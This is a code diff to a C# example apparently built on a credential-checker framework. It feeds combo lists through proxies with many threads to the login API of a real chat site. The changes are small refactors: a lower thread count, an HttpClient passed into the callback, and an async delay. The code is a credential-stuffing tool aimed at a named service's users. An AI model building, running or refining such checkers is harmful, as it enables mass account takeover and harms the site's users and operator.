@@ -34,10 +34,10 @@ namespace Milky.Examples
                 .WithCombos(combos)
                 .WithSettings(new CheckSettings
                 {
-                    Threads = 300,
+                    Threads = 100,
                     OutputInvalids = false
                 })
-                .WithCheckingProcess(async (combo, proxy) =>
+                .WithCheckingProcess(async (combo, proxy, httpClient) =>
                 {
                     var result = CheckResult.Unknown;
                     Dictionary<string, string> captures = null;
@@ -46,8 +46,6 @@ namespace Milky.Examples
                     {
                         try
                         {
-                            using var httpClient = new HttpClient();
-
                             using var requestMessage = new HttpRequestMessage(HttpMethod.Post, "https://en.clubcooee.com/api3/auth_login")
                             {
                                 Content = new FormUrlEncodedContent(new Dictionary<string, string>
@@ -106,7 +104,7 @@ namespace Milky.Examples
             console.Start();
             await check.StartAsync();
 
-            Thread.Sleep(-1);
+            await Task.Delay(-1);
         }
     }
 }
